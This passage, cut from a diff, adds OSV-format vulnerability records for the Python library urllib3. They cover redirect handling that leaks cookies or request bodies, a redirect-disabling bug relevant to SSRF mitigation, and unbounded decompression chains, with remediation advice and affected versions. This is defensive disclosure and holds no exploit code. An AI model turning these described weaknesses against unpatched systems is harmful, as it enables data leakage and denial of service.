+          "details": "urllib3 previously wouldn't remove the HTTP request body when an HTTP redirect response using status 303 \"See Other\" after the request had its method changed from one that could accept a request body (like `POST`) to `GET` as is required by HTTP RFCs. Although the behavior of removing the request body is not specified in the section for redirects, it can be inferred by piecing together information from different sections and we have observed the behavior in other major HTTP client implementations like curl and web browsers.\n\nFrom [RFC 9110 Section 9.3.1](https://www.rfc-editor.org/rfc/rfc9110.html#name-get):\n\n> A client SHOULD NOT generate content in a GET request unless it is made directly to an origin server that has previously indicated, in or out of band, that such a request has a purpose and will be adequately supported.\n\n## Affected usages\n\nBecause the vulnerability requires a previously trusted service to become compromised in order to have an impact on confidentiality we believe the exploitability of this vulnerability is low. Additionally, many users aren't putting sensitive data in HTTP request bodies, if this is the case then this vulnerability isn't exploitable.\n\nBoth of the following conditions must be true to be affected by this vulnerability:\n\n* If you're using urllib3 and submitting sensitive information in the HTTP request body (such as form data or JSON)\n* The origin service is compromised and starts redirecting using 303 to a malicious peer or the redirected-to service becomes compromised.\n\n## Remediation\n\nYou can remediate this vulnerability with any of the following steps:\n\n* Upgrade to a patched version of urllib3 (v1.26.18 or v2.0.7)\n* Disable redirects for services that you aren't expecting to respond with redirects with `redirects=False`.\n* Disable automatic redirects with `redirects=False` and handle 303 redirects manually by stripping the HTTP request body.",
+          "aliases": [
+            "CVE-2023-45803",
+            "PYSEC-2023-212"
+          ],
+          "modified": "2026-02-04T03:30:16.767903Z",
+          "published": "2023-10-17T20:15:25Z",
+          "related": [
+            "CGA-rwm8-v848-xm84"
+          ],
+          "database_specific": {
+            "severity": "MODERATE",
+            "cwe_ids": [
+              "CWE-200"
+            ],
+            "nvd_published_at": "2023-10-17T20:15:10Z",
+            "github_reviewed": true,
+            "github_reviewed_at": "2023-10-17T20:15:25Z"
+          },
+          "references": [
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-g4mx-q9vg-27p4"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-45803"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/commit/4e50fbc5db74e32cabd5ccc1ab81fc103adfe0b3"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/commit/4e98d57809dacab1cbe625fddeec1a290c478ea9"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/commit/b594c5ceaca38e1ac215f916538fb128e3526a36"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/pypa/advisory-database/tree/main/vulns/urllib3/PYSEC-2023-212.yaml"
+            },
+            {
+              "type": "PACKAGE",
+              "url": "https://github.com/urllib3/urllib3"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/releases/tag/1.26.18"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/releases/tag/2.0.7"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.debian.org/debian-lts-announce/2024/12/msg00020.html"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4R2Y5XK3WALSR3FNAGN7JBYV2B343ZKB"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5F5CUBAN5XMEBVBZPHFITBLMJV5FIJJ5"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PPDPLM6UUMN55ESPQWJFLLIZY4ZKCNRX"
+            },
+            {
+              "type": "WEB",
+              "url": "https://www.rfc-editor.org/rfc/rfc9110.html#name-get"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "urllib3",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/urllib3"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "2.0.0"
+                    },
+                    {
+                      "fixed": "2.0.7"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "2.0.0",
+                "2.0.1",
+                "2.0.2",
+                "2.0.3",
+                "2.0.4",
+                "2.0.5",
+                "2.0.6"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/10/GHSA-g4mx-q9vg-27p4/GHSA-g4mx-q9vg-27p4.json"
+              }
+            },
+            {
+              "package": {
+                "name": "urllib3",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/urllib3"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "0"
+                    },
+                    {
+                      "fixed": "1.26.18"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "0.2",
+                "0.3",
+                "0.3.1",
+                "0.4.0",
+                "0.4.1",
+                "1.0",
+                "1.0.1",
+                "1.0.2",
+                "1.1",
+                "1.10",
+                "1.10.1",
+                "1.10.2",
+                "1.10.3",
+                "1.10.4",
+                "1.11",
+                "1.12",
+                "1.13",
+                "1.13.1",
+                "1.14",
+                "1.15",
+                "1.15.1",
+                "1.16",
+                "1.17",
+                "1.18",
+                "1.18.1",
+                "1.19",
+                "1.19.1",
+                "1.2",
+                "1.2.1",
+                "1.2.2",
+                "1.20",
+                "1.21",
+                "1.21.1",
+                "1.22",
+                "1.23",
+                "1.24",
+                "1.24.1",
+                "1.24.2",
+                "1.24.3",
+                "1.25",
+                "1.25.1",
+                "1.25.10",
+                "1.25.11",
+                "1.25.2",
+                "1.25.3",
+                "1.25.4",
+                "1.25.5",
+                "1.25.6",
+                "1.25.7",
+                "1.25.8",
+                "1.25.9",
+                "1.26.0",
+                "1.26.1",
+                "1.26.10",
+                "1.26.11",
+                "1.26.12",
+                "1.26.13",
+                "1.26.14",
+                "1.26.15",
+                "1.26.16",
+                "1.26.17",
+                "1.26.2",
+                "1.26.3",
+                "1.26.4",
+                "1.26.5",
+                "1.26.6",
+                "1.26.7",
+                "1.26.8",
+                "1.26.9",
+                "1.3",
+                "1.4",
+                "1.5",
+                "1.6",
+                "1.7",
+                "1.7.1",
+                "1.8",
+                "1.8.2",
+                "1.8.3",
+                "1.9",
+                "1.9.1"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/10/GHSA-g4mx-q9vg-27p4/GHSA-g4mx-q9vg-27p4.json"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V3",
+              "score": "CVSS:3.1/AV:A/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N"
+            },
+            {
+              "type": "CVSS_V4",
+              "score": "CVSS:4.0/AV:A/AC:L/AT:P/PR:H/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+            }
+          ]
+        },
+        {
+          "id": "GHSA-gm62-xv2j-4w53",
+          "summary": "urllib3 allows an unbounded number of links in the decompression chain",
+          "details": "## Impact\n\nurllib3 supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., `Content-Encoding: gzip, zstd`).\n\nHowever, the number of links in the decompression chain was unbounded allowing a malicious server to insert a virtually unlimited number of compression steps leading to high CPU usage and massive memory allocation for the decompressed data.\n\n\n## Affected usages\n\nApplications and libraries using urllib3 version 2.5.0 and earlier for HTTP requests to untrusted sources unless they disable content decoding explicitly.\n\n\n## Remediation\n\nUpgrade to at least urllib3 v2.6.0 in which the library limits the number of links to 5.\n\nIf upgrading is not immediately possible, use [`preload_content=False`](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) and ensure that `resp.headers[\"content-encoding\"]` contains a safe number of encodings before reading the response content.",
+          "aliases": [
+            "CVE-2025-66418"
+          ],
+          "modified": "2026-02-04T03:37:15.919661Z",
+          "published": "2025-12-05T18:15:19Z",
+          "related": [
+            "CGA-w59h-375r-3v44"
+          ],
+          "database_specific": {
+            "nvd_published_at": "2025-12-05T16:15:51Z",
+            "severity": "HIGH",
+            "github_reviewed_at": "2025-12-05T18:15:19Z",
+            "cwe_ids": [
+              "CWE-770"
+            ],
+            "github_reviewed": true
+          },
+          "references": [
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-gm62-xv2j-4w53"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66418"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/commit/24d7b67eac89f94e11003424bcf0d8f7b72222a8"
+            },
+            {
+              "type": "PACKAGE",
+              "url": "https://github.com/urllib3/urllib3"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "urllib3",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/urllib3"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "1.24"
+                    },
+                    {
+                      "fixed": "2.6.0"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "1.24",
+                "1.24.1",
+                "1.24.2",
+                "1.24.3",
+                "1.25",
+                "1.25.1",
+                "1.25.10",
+                "1.25.11",
+                "1.25.2",
+                "1.25.3",
+                "1.25.4",
+                "1.25.5",
+                "1.25.6",
+                "1.25.7",
+                "1.25.8",
+                "1.25.9",
+                "1.26.0",
+                "1.26.1",
+                "1.26.10",
+                "1.26.11",
+                "1.26.12",
+                "1.26.13",
+                "1.26.14",
+                "1.26.15",
+                "1.26.16",
+                "1.26.17",
+                "1.26.18",
+                "1.26.19",
+                "1.26.2",
+                "1.26.20",
+                "1.26.3",
+                "1.26.4",
+                "1.26.5",
+                "1.26.6",
+                "1.26.7",
+                "1.26.8",
+                "1.26.9",
+                "2.0.0",
+                "2.0.0a1",
+                "2.0.0a2",
+                "2.0.0a3",
+                "2.0.0a4",
+                "2.0.1",
+                "2.0.2",
+                "2.0.3",
+                "2.0.4",
+                "2.0.5",
+                "2.0.6",
+                "2.0.7",
+                "2.1.0",
+                "2.2.0",
+                "2.2.1",
+                "2.2.2",
+                "2.2.3",
+                "2.3.0",
+                "2.4.0",
+                "2.5.0"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-gm62-xv2j-4w53/GHSA-gm62-xv2j-4w53.json"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V4",
+              "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H"
+            }
+          ]
+        },
+        {
+          "id": "GHSA-pq67-6m6q-mj2v",
+          "summary": "urllib3 redirects are not disabled when retries are disabled on PoolManager instantiation",
+          "details": "urllib3 handles redirects and retries using the same mechanism, which is controlled by the `Retry` object. The most common way to disable redirects is at the request level, as follows:\n\n```python\nresp = urllib3.request(\"GET\", \"https://httpbin.org/redirect/1\", redirect=False)\nprint(resp.status)\n# 302\n```\n\nHowever, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:\n\n```python\nimport urllib3\n\nhttp = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect\nhttp = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above\nhttp = urllib3.PoolManager(retries=False)  # should return the first response\n\nresp = http.request(\"GET\", \"https://httpbin.org/redirect/1\")\n```\n\nHowever, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.\n\n## Affected usages\n\nPassing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.\n\nBy default, requests and botocore users are not affected.\n\n## Impact\n\nRedirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects at the PoolManager level will remain vulnerable.\n\n## Remediation\n\nYou can remediate this vulnerability with the following steps:\n\n * Upgrade to a patched version of urllib3. If your organization would benefit from the continued support of urllib3 1.x, please contact [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com) to discuss sponsorship or contribution opportunities.\n * Disable redirects at the `request()` level instead of the `PoolManager()` level.",
+          "aliases": [
+            "CVE-2025-50181"
+          ],
+          "modified": "2026-02-04T04:38:01.163387Z",
+          "published": "2025-06-18T17:50:00Z",
+          "related": [
+            "CGA-gmjc-pjmc-6f5f"
+          ],
+          "database_specific": {
+            "github_reviewed_at": "2025-06-18T17:50:00Z",
+            "cwe_ids": [
+              "CWE-601"
+            ],
+            "github_reviewed": true,
+            "nvd_published_at": "2025-06-19T01:15:24Z",
+            "severity": "MODERATE"
+          },
+          "references": [
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-pq67-6m6q-mj2v"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-50181"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/commit/f05b1329126d5be6de501f9d1e3e36738bc08857"
+            },
+            {
+              "type": "PACKAGE",
+              "url": "https://github.com/urllib3/urllib3"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/releases/tag/2.5.0"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "urllib3",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/urllib3"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "0"
+                    },
+                    {
+                      "fixed": "2.5.0"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "0.2",
+                "0.3",
+                "0.3.1",
+                "0.4.0",
+                "0.4.1",
+                "1.0",
+                "1.0.1",
+                "1.0.2",
+                "1.1",
+                "1.10",
+                "1.10.1",
+                "1.10.2",
+                "1.10.3",
+                "1.10.4",
+                "1.11",
+                "1.12",
+                "1.13",
+                "1.13.1",
+                "1.14",
+                "1.15",
+                "1.15.1",
+                "1.16",
+                "1.17",
+                "1.18",
+                "1.18.1",
+                "1.19",
+                "1.19.1",
+                "1.2",
+                "1.2.1",
+                "1.2.2",
+                "1.20",
+                "1.21",
+                "1.21.1",
+                "1.22",
+                "1.23",
+                "1.24",
+                "1.24.1",
+                "1.24.2",
+                "1.24.3",
+                "1.25",
+                "1.25.1",
+                "1.25.10",
+                "1.25.11",
+                "1.25.2",
+                "1.25.3",
+                "1.25.4",
+                "1.25.5",
+                "1.25.6",
+                "1.25.7",
+                "1.25.8",
+                "1.25.9",
+                "1.26.0",
+                "1.26.1",
+                "1.26.10",
+                "1.26.11",
+                "1.26.12",
+                "1.26.13",
+                "1.26.14",
+                "1.26.15",
+                "1.26.16",
+                "1.26.17",
+                "1.26.18",
+                "1.26.19",
+                "1.26.2",
+                "1.26.20",
+                "1.26.3",
+                "1.26.4",
+                "1.26.5",
+                "1.26.6",
+                "1.26.7",
+                "1.26.8",
+                "1.26.9",
+                "1.3",
+                "1.4",
+                "1.5",
+                "1.6",
+                "1.7",
+                "1.7.1",
+                "1.8",
+                "1.8.2",
+                "1.8.3",
+                "1.9",
+                "1.9.1",
+                "2.0.0",
+                "2.0.0a1",
+                "2.0.0a2",
+                "2.0.0a3",
+                "2.0.0a4",
+                "2.0.1",
+                "2.0.2",
+                "2.0.3",
+                "2.0.4",
+                "2.0.5",
+                "2.0.6",
+                "2.0.7",
+                "2.1.0",
+                "2.2.0",
+                "2.2.1",
+                "2.2.2",
+                "2.2.3",
+                "2.3.0",
+                "2.4.0"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-pq67-6m6q-mj2v/GHSA-pq67-6m6q-mj2v.json"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V3",
+              "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N"
+            }
+          ]
+        },
+        {
+          "id": "GHSA-v845-jxx5-vc9f",
+          "summary": "`Cookie` HTTP header isn't stripped on cross-origin redirects",
+          "details": "urllib3 doesn't treat the `Cookie` HTTP header special or provide any helpers for managing cookies over HTTP, that is the responsibility of the user. However, it is possible for a user to specify a `Cookie` header and unknowingly leak information via HTTP redirects to a different origin if that user doesn't disable redirects explicitly.\n\nUsers **must** handle redirects themselves instead of relying on urllib3's automatic redirects to achieve safe processing of the `Cookie` header, thus we decided to strip the header by default in order to further protect users who aren't using the correct approach.\n\n## Affected usages\n\nWe believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:\n\n* Using an affected version of urllib3 (patched in v1.26.17 and v2.0.6)\n* Using the `Cookie` header on requests, which is mostly typical for impersonating a browser.\n* Not disabling HTTP redirects\n* Either not using HTTPS or for the origin server to redirect to a malicious origin.\n\n## Remediation\n\n* Upgrading to at least urllib3 v1.26.17 or v2.0.6\n* Disabling HTTP redirects using `redirects=False` when sending requests.\n* Not using the `Cookie` header.",
+          "aliases": [
+            "CVE-2023-43804",
+            "PYSEC-2023-192"
+          ],
+          "modified": "2026-02-04T02:58:30.152562Z",
+          "published": "2023-10-02T23:27:05Z",
+          "related": [
+            "CGA-vgg3-gvpc-fvqw"
+          ],
+          "database_specific": {
+            "severity": "HIGH",
+            "cwe_ids": [
+              "CWE-200"
+            ],
+            "nvd_published_at": "2023-10-04T17:15:10Z",
+            "github_reviewed": true,
+            "github_reviewed_at": "2023-10-02T23:27:05Z"
+          },
+          "references": [
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-v845-jxx5-vc9f"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43804"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/commit/01220354d389cd05474713f8c982d05c9b17aafb"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/commit/644124ecd0b6e417c527191f866daa05a5a2056d"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/pypa/advisory-database/tree/main/vulns/urllib3/PYSEC-2023-192.yaml"
+            },
+            {
+              "type": "PACKAGE",
+              "url": "https://github.com/urllib3/urllib3"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.debian.org/debian-lts-announce/2023/10/msg00012.html"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.debian.org/debian-lts-announce/2024/12/msg00020.html"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5F5CUBAN5XMEBVBZPHFITBLMJV5FIJJ5"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/I3PR7C6RJ6JUBQKIJ644DMIJSUP36VDY"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NDAGZXYJ7H2G3SB47M453VQVNAWKAEJJ"
+            },
+            {
+              "type": "WEB",
+              "url": "https://security.netapp.com/advisory/ntap-20241213-0007"
+            },
+            {
+              "type": "WEB",
+              "url": "https://www.vicarius.io/vsociety/posts/cve-2023-43804-urllib3-vulnerability-3"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "urllib3",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/urllib3"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "2.0.0"
+                    },
+                    {
+                      "fixed": "2.0.6"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "2.0.0",
+                "2.0.1",
+                "2.0.2",
+                "2.0.3",
+                "2.0.4",
+                "2.0.5"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/10/GHSA-v845-jxx5-vc9f/GHSA-v845-jxx5-vc9f.json"
+              }
+            },
+            {
+              "package": {
+                "name": "urllib3",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/urllib3"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "0"
+                    },
+                    {
+                      "fixed": "1.26.17"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "0.2",
+                "0.3",
+                "0.3.1",
+                "0.4.0",
+                "0.4.1",
+                "1.0",
+                "1.0.1",
+                "1.0.2",
+                "1.1",
+                "1.10",
+                "1.10.1",
+                "1.10.2",
+                "1.10.3",
+                "1.10.4",
+                "1.11",
+                "1.12",
+                "1.13",
+                "1.13.1",
+                "1.14",
+                "1.15",
+                "1.15.1",
+                "1.16",
+                "1.17",
+                "1.18",
+                "1.18.1",
+                "1.19",
+                "1.19.1",
+                "1.2",
+                "1.2.1",
+                "1.2.2",
+                "1.20",
+                "1.21",
+                "1.21.1",
+                "1.22",
+                "1.23",
+                "1.24",
+                "1.24.1",
+                "1.24.2",
+                "1.24.3",
+                "1.25",
+                "1.25.1",
+                "1.25.10",
+                "1.25.11",
+                "1.25.2",
+                "1.25.3",
+                "1.25.4",
+                "1.25.5",
+                "1.25.6",
+                "1.25.7",
+                "1.25.8",
+                "1.25.9",
+                "1.26.0",
+                "1.26.1",
+                "1.26.10",
+                "1.26.11",
+                "1.26.12",
+                "1.26.13",
+                "1.26.14",
+                "1.26.15",
+                "1.26.16",
+                "1.26.2",
+                "1.26.3",
+                "1.26.4",
+                "1.26.5",
+                "1.26.6",
+                "1.26.7",
+                "1.26.8",
+                "1.26.9",
+                "1.3",
+                "1.4",
+                "1.5",
+                "1.6",
+                "1.7",
+                "1.7.1",
+                "1.8",
+                "1.8.2",
+                "1.8.3",
+                "1.9",
+                "1.9.1"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/10/GHSA-v845-jxx5-vc9f/GHSA-v845-jxx5-vc9f.json"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V3",
+              "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N"
+            },
+            {
+              "type": "CVSS_V4",
+              "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
+            }
+          ]
+        },
+        {
+          "id": "PYSEC-2023-192",
+          "details": "urllib3 is a user-friendly HTTP client library for Python. urllib3 doesn't treat the `Cookie` HTTP header special or provide any helpers for managing cookies over HTTP, that is the responsibility of the user. However, it is possible for a user to specify a `Cookie` header and unknowingly leak information via HTTP redirects to a different origin if that user doesn't disable redirects explicitly. This issue has been patched in urllib3 version 1.26.17 or 2.0.5.",
+          "aliases": [
+            "CVE-2023-43804",
+            "GHSA-v845-jxx5-vc9f"
+          ],
+          "modified": "2023-11-08T04:13:33.452167Z",
+          "published": "2023-10-04T17:15:00Z",
+          "references": [
+            {
+              "type": "FIX",
+              "url": "https://github.com/urllib3/urllib3/commit/644124ecd0b6e417c527191f866daa05a5a2056d"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-v845-jxx5-vc9f"
+            },
+            {
+              "type": "FIX",
+              "url": "https://github.com/urllib3/urllib3/commit/01220354d389cd05474713f8c982d05c9b17aafb"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.debian.org/debian-lts-announce/2023/10/msg00012.html"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "urllib3",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/urllib3"
+              },
+              "ranges": [
+                {
+                  "type": "GIT",
+                  "repo": "https://github.com/urllib3/urllib3",
+                  "events": [
+                    {
+                      "introduced": "0"
+                    },
+                    {
+                      "fixed": "644124ecd0b6e417c527191f866daa05a5a2056d"
+                    },
+                    {
+                      "fixed": "01220354d389cd05474713f8c982d05c9b17aafb"
+                    }
+                  ]
+                },
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "2.0.0"
+                    },
+                    {
+                      "fixed": "2.0.6"
+                    },
+                    {
+                      "introduced": "0"
+                    },
+                    {
+                      "fixed": "1.26.17"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "0.2",
+                "0.3",
+                "0.3.1",
+                "0.4.0",
+                "0.4.1",
+                "1.0",
+                "1.0.1",
+                "1.0.2",
+                "1.1",
+                "1.10",
+                "1.10.1",
+                "1.10.2",
+                "1.10.3",
+                "1.10.4",
+                "1.11",
+                "1.12",
+                "1.13",
+                "1.13.1",
+                "1.14",
+                "1.15",
+                "1.15.1",
+                "1.16",
+                "1.17",
+                "1.18",
+                "1.18.1",
+                "1.19",
+                "1.19.1",
+                "1.2",
+                "1.2.1",
+                "1.2.2",
+                "1.20",
+                "1.21",
+                "1.21.1",
+                "1.22",
+                "1.23",
+                "1.24",
+                "1.24.1",
+                "1.24.2",
+                "1.24.3",
+                "1.25",
+                "1.25.1",
+                "1.25.10",
+                "1.25.11",
+                "1.25.2",
+                "1.25.3",
+                "1.25.4",
+                "1.25.5",
+                "1.25.6",
+                "1.25.7",
+                "1.25.8",
+                "1.25.9",
+                "1.26.0",
+                "1.26.1",
+                "1.26.10",
+                "1.26.11",
+                "1.26.12",
+                "1.26.13",
+                "1.26.14",
+                "1.26.15",
+                "1.26.16",
+                "1.26.2",
+                "1.26.3",
+                "1.26.4",
+                "1.26.5",
+                "1.26.6",
+                "1.26.7",
+                "1.26.8",
+                "1.26.9",
+                "1.3",
+                "1.4",
+                "1.5",
+                "1.6",
+                "1.7",
+                "1.7.1",
+                "1.8",
+                "1.8.2",
+                "1.8.3",
+                "1.9",
+                "1.9.1",
+                "2.0.0",
+                "2.0.1",
+                "2.0.2",
+                "2.0.3",
+                "2.0.4",
+                "2.0.5"
+              ],
+              "database_specific": {
+                "source": "https://github.com/pypa/advisory-database/blob/main/vulns/urllib3/PYSEC-2023-192.yaml"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V3",
+              "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
+            }
+          ]
+        },
+        {
+          "id": "PYSEC-2023-212",
+          "details": "urllib3 is a user-friendly HTTP client library for Python. urllib3 previously wouldn't remove the HTTP request body when an HTTP redirect response using status 301, 302, or 303 after the request had its method changed from one that could accept a request body (like `POST`) to `GET` as is required by HTTP RFCs. Although this behavior is not specified in the section for redirects, it can be inferred by piecing together information from different sections and we have observed the behavior in other major HTTP client implementations like curl and web browsers. Because the vulnerability requires a previously trusted service to become compromised in order to have an impact on confidentiality we believe the exploitability of this vulnerability is low. Additionally, many users aren't putting sensitive data in HTTP request bodies, if this is the case then this vulnerability isn't exploitable. Both of the following conditions must be true to be affected by this vulnerability: 1. Using urllib3 and submitting sensitive information in the HTTP request body (such as form data or JSON) and 2. The origin service is compromised and starts redirecting using 301, 302, or 303 to a malicious peer or the redirected-to service becomes compromised. This issue has been addressed in versions 1.26.18 and 2.0.7 and users are advised to update to resolve this issue. Users unable to update should disable redirects for services that aren't expecting to respond with redirects with `redirects=False` and disable automatic redirects with `redirects=False` and handle 301, 302, and 303 redirects manually by stripping the HTTP request body.\n",
+          "aliases": [
+            "CVE-2023-45803",
+            "GHSA-g4mx-q9vg-27p4"
+          ],
+          "modified": "2023-11-08T04:13:39.165450Z",
+          "published": "2023-10-17T20:15:00Z",
+          "references": [
+            {
+              "type": "ADVISORY",
+              "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-g4mx-q9vg-27p4"
+            },
+            {
+              "type": "WEB",
+              "url": "https://www.rfc-editor.org/rfc/rfc9110.html#name-get"
+            },
+            {
+              "type": "FIX",
+              "url": "https://github.com/urllib3/urllib3/commit/4e98d57809dacab1cbe625fddeec1a290c478ea9"
+            },
+            {
+              "type": "ARTICLE",
+              "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PPDPLM6UUMN55ESPQWJFLLIZY4ZKCNRX/"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "urllib3",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/urllib3"
+              },
+              "ranges": [
+                {
+                  "type": "GIT",
+                  "repo": "https://github.com/urllib3/urllib3",
+                  "events": [
+                    {
+                      "introduced": "0"
+                    },
+                    {
+                      "fixed": "4e98d57809dacab1cbe625fddeec1a290c478ea9"
+                    }
+                  ]
+                },
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "2.0.0"
+                    },
+                    {
+                      "fixed": "2.0.7"
+                    },
+                    {
+                      "introduced": "0"
+                    },
+                    {
+                      "fixed": "1.26.18"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "0.2",
+                "0.3",
+                "0.3.1",
+                "0.4.0",
+                "0.4.1",
+                "1.0",
+                "1.0.1",
+                "1.0.2",
+                "1.1",
+                "1.10",
+                "1.10.1",
+                "1.10.2",
+                "1.10.3",
+                "1.10.4",
+                "1.11",
+                "1.12",
+                "1.13",
+                "1.13.1",
+                "1.14",
+                "1.15",
+                "1.15.1",
+                "1.16",
+                "1.17",
+                "1.18",
+                "1.18.1",
+                "1.19",
+                "1.19.1",
+                "1.2",
+                "1.2.1",
+                "1.2.2",
+                "1.20",
+                "1.21",
+                "1.21.1",
+                "1.22",
+                "1.23",
+                "1.24",
+                "1.24.1",
+                "1.24.2",
+                "1.24.3",
+                "1.25",
+                "1.25.1",
+                "1.25.10",
+                "1.25.11",
+                "1.25.2",
+                "1.25.3",
